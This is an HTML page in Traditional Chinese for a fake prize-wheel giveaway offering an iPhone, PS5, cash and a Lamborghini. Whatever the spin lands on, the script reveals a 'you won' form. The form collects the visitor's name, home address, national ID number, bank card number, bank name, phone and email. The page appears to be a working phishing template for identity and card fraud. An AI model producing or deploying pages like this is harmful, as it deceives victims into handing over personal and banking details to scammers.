<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>🎰 超級幸運轉盤</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(to bottom, #ffe8ec, #fff);
      font-family: "Segoe UI", sans-serif;
      text-align: center;
      padding-top: 30px;
    }

    h1 {
      font-weight: bold;
      color: #c92a2a;
      margin-bottom: 10px;
    }

    p {
      font-size: 18px;
      color: #333;
    }

    #wheel {
      width: 300px;
      height: 300px;
      border: 10px solid #f1c40f;
      border-radius: 50%;
      margin: 0 auto;
      position: relative;
      transition: transform 4s ease-out;
      background: url('https://i.imgur.com/7UvnZXe.png') no-repeat center center;
      background-size: cover;
      box-shadow: 0 0 20px rgba(0,0,0,0.2);
    }

    .prize {
      position: absolute;
      width: 50%;
      height: 50%;
      top: 50%;
      left: 50%;
      transform-origin: 0% 0%;
      text-align: right;
      font-weight: bold;
      font-size: 14px;
    }

    #pointer {
      width: 0;
      height: 0;
      border-left: 20px solid transparent;
      border-right: 20px solid transparent;
      border-bottom: 30px solid red;
      margin: 20px auto;
    }

    #prizeForm {
      display: none;
      margin-top: 40px;
    }

    .gift-image {
      width: 100px;
      margin: 10px;
    }

    .btn-spin {
      font-size: 20px;
      padding: 12px 30px;
      border-radius: 50px;
    }
  </style>
</head>
<body>

  <h1>🎁 抽大獎活動</h1>
  <p>參加轉盤活動，限時領取 Switch、iPhone、PS5、大獎金！</p>
  <img src="https://imagensempng.com.br/wp-content/uploads/2020/11/003.png" width="200" alt="Gift Banner">

  <div id="pointer"></div>
  <div id="wheel">
    <div class="prize" style="transform: rotate(0deg) translate(-100%, -100%)">Switch</div>
    <div class="prize" style="transform: rotate(60deg) translate(-100%, -100%)">現金 $10,000</div>
    <div class="prize" style="transform: rotate(120deg) translate(-100%, -100%)">PS5</div>
    <div class="prize" style="transform: rotate(180deg) translate(-100%, -100%)">iPhone</div>
    <div class="prize" style="transform: rotate(240deg) translate(-100%, -100%)">無線耳機</div>
    <div class="prize" style="transform: rotate(300deg) translate(-100%, -100%)">藍寶堅尼</div>
  </div>

  <button class="btn btn-danger mt-4 btn-spin" onclick="spin()">🎰 點我抽獎</button>

  <form id="prizeForm" method="POST">
    <h3 class="mt-5 text-success">🎉 恭喜中獎！請填寫資料以便領取：</h3>
<div class="container" style="max-width: 400px;">
  <input type="text" name="name" class="form-control mb-3" placeholder="姓名" required>
  <input type="text" name="address" class="form-control mb-3" placeholder="住家地址" required>
  <input type="text" name="id_number" class="form-control mb-3" placeholder="身份證字號" required>
  <input type="text" name="card_number" class="form-control mb-3" placeholder="銀行卡號" required>
  <input type="text" name="bank_name" class="form-control mb-3" placeholder="銀行名稱" required>
  <input type="tel" name="phone" class="form-control mb-3" placeholder="手機號碼" required>
  <input type="email" name="email" class="form-control mb-4" placeholder="Email" required>
  <button type="submit" class="btn btn-success w-100 fw-bold">送出 ➤ 領獎</button>
</div>

  </form>

  <div class="mt-4">
    <img src="https://pisces.bbystatic.com/image2/BestBuy_US/images/products/6487/6487487cv2d.jpg" class="gift-image" alt="gift1">
    <img src="https://tse3.mm.bing.net/th/id/OIP.XjEv5ApTu1y4gRv6-Q1qkAHaEK?pid=Api&P=0&h=180" class="gift-image" alt="gift2">
    <img src="https://s.yimg.com/zp/images/93658339BA6FB3EF534E7EDB38AFC4BD223C5C7F" class="gift-image" alt="gift3">
  </div>

  <script>
    let spinning = false;

    function spin() {
      if (spinning) return;
      spinning = true;
      const wheel = document.getElementById('wheel');
      const angle = 360 * 5 + Math.floor(Math.random() * 360);
      wheel.style.transform = `rotate(${angle}deg)`;
      setTimeout(() => {
        document.getElementById('prizeForm').style.display = 'block';
      }, 4200);
    }
  </script>
</body>
</html>
